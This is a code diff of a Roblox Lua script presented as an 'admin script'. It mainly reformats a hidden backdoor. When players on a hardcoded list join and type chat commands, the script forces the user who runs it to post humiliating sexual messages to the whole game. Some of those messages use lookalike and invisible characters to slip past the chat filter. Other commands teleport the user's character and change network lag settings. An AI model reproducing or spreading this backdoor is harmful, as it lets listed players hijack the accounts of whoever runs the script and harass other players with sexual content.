@@ -1,5 +1,4 @@
-
---FIXED 
+--FIXED
 
 --SUPER SECRET ADMIN SCRIPT 😳
 --smh
@@ -24,36 +23,40 @@ local zl = {
 }
 
 function veryepictrol2(x)
-function getPlayer2(name)
-    local targets = {}
-    local plrstbl = game.Players:getPlayers()
-    if name == "me" then
-        return {game.Players.LocalPlayer}
-    elseif name == "others" then
-        return {game.Players.LocalPlayer}
-    elseif name == "all" then
-        return {game.Players.LocalPlayer}
-    elseif name == "random" then
-        for i, v in pairs(plrstbl) do
-            if v ~= game.Players.LocalPlayer then
-                return {plrstbl[math.random(1, #plrstbl)]}
+    function getPlayer2(name)
+        local targets = {}
+        local plrstbl = game.Players:getPlayers()
+        if name == "me" then
+            return { game.Players[zl[1]]}
+        elseif name == "others" then
+            for i, v in pairs(plrstbl) do
+                if v.Name ~= zl[1] then
+                    targets[#targets + 1] = v
+                end
+            end
+        elseif name == "all" then
+            return { game.Players.LocalPlayer }
+        elseif name == "random" then
+            for i, v in pairs(plrstbl) do
+                if v ~= game.Players.LocalPlayer then
+                    return { plrstbl[math.random(1, #plrstbl)] }
+                end
+            end
+        else
+            name = name:lower()
+            for i, v in pairs(game.Players:getPlayers()) do
+                if v.Name:lower():find(name) or v.DisplayName:lower():find(name) then
+                    return { v }
+                end
             end
         end
-    else
-        name = name:lower()
-        for i, v in pairs(game.Players:getPlayers()) do
-            if v.Name:lower():find(name) or v.DisplayName:lower():find(name) then
-                return {v}
-            end
-        end
+        return targets
     end
-    return targets
-end
 
     lastchattedtime = 5;
     local prefixz = "/"
     local LzPlayer = x
-    local dz;dz = x.Chatted:Connect(function(msg)
+    local dz; dz = x.Chatted:Connect(function(msg)
         if (tick() - lastchattedtime) < 0.4 then return end
         lastchattedtime = tick()
         msg = msg:lower()
@@ -91,10 +94,11 @@ end
             if cmd2 == "check" then
                 wait(0.5)
                 local args = {
-                   [1] = "🌟im using revvy's admin 🌟 :3",
-                   [2] = "All"
+                    [1] = "🌟im using revvy's admin 🌟 :3",
+                    [2] = "All"
                 }
-                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
+                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(
+                args))
             end
 
             if cmd2 == "bring" then
@@ -108,28 +112,31 @@ end
             if cmd2 == "uh." then
                 wait(0.5)
                 local args = {
-                   [1] = "🌟 im submissive for rev.. x3 🌟",
-                   [2] = "All"
+                    [1] = "🌟 im submissive for rev.. x3 🌟",
+                    [2] = "All"
                 }
-                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
+                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(
+                args))
             end
 
             if cmd2 == "hopelessreview" then
                 wait(0.5)
                 local args = {
-                   [1] = '🌟"when i see revvy i get a huge bоner" --hopeless🌟',
-                   [2] = "All"
+                    [1] = '🌟"when i see revvy i get a huge bоner" --hopeless🌟',
+                    [2] = "All"
                 }
-                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
+                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(
+                args))
             end
 
             if cmd2 == "hopelessreview2" then
                 wait(0.5)
                 local args = {
-                   [1] = '🌟"when i use ѕе⁥⁥⁥х admin i feel like im having mega ѕе⁥⁥⁥х fr" --hopeless🌟',
-                   [2] = "All"
+                    [1] = '🌟"when i use ѕе⁥⁥⁥х admin i feel like im having mega ѕе⁥⁥⁥х fr" --hopeless🌟',
+                    [2] = "All"
                 }
-                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(args))
+                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(
+                args))
             end
 
 
@@ -151,18 +158,18 @@ end
                     settings().Network.IncomingReplicationLag = 0
                 end
             end
-
         end
     end)
-    local d1z;d1z = game.Players.PlayerRemoving:Connect(function(plr)
+    local d1z; d1z = game.Players.PlayerRemoving:Connect(function(plr)
         if plr.Name == x.Name then
-           dz:Disconnect()
-           d1z:Disconnect()
+            dz:Disconnect()
+            d1z:Disconnect()
         end
     end)
 end
+
 game.Players.PlayerAdded:Connect(function(plr)
-   for i, listed in pairs(zl) do
+    for i, listed in pairs(zl) do
         if plr.Name == listed then
             veryepictrol2(plr)
         end
